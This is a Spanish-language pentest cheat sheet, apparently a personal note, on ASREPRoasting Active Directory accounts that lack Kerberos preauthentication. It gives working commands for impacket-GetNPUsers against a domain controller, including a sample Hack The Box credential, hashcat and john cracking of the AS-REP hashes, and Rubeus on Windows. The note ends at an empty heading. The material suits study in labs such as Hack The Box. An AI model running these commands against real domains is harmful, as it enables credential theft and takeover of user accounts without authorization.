## DESCRIPTION

![[Pasted image 20230525200335.png]]

El ASREPRoast es una técnica similar al Kerberoasting, que también busca el crackeo offline de las credenciales.

Cuando un usuario está configurado con el atributo DONT_REQ_PREAUTH, no necesita preautenticación, con lo que es posible construir un mensaje KRB_AS_REQ sin conocer las credenciales del mismo.

Una vez construído y enviado, el KDC responderá con un mensaje KRB_AS_REP que contiene datos cifrados con el hash de este usuario, pudiendo ser utilizados para el crackeo offline.


What's we need? →  User and DONT_REQ_PREAUTH atribute
What's we obtain? → USER hash NTLM 


#### Mas información
* 


## EXPLOITATION

### OPTION 1: KALI

1. Explotación:

```
impacket-GetNPUsers -dc-ip 10.10.10.192 -no-pass -usersfile usuarios-kerberos.txt blackfield.local/

#Con usuario login
impacket-GetNPUsers -dc-ip <<IP DC>> <<dominio>>/<<USER>>:<<PASS>> -request -format john -outputfile hash

Ejemplo

impacket-GetNPUsers active.htb/SVC_TGS:GPPstillStandingStrong2k18 -request -format john -outputfile hash

```

Si tenemos un usuario y una pass también podemos usar también ASEREPROAST para obtener el ticket de otros usuarios (SIGUIENTE APARTADO)

2. Cracking

```
sudo hashcat -m 18200 hashes.asreproast2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --forc

john --wordlist=<passwords_file> <AS_REP_responses_file>
```

### OPTION 2: WIN

```
.\Rubeus.exe asreproast  /format:<AS_REP_responses_format [hashcat | john]> /outfile:<output_hashes_file>
```

## MACHINES

* Hack The Box: Forest

**!!NOTA IMPORTANTE!!** 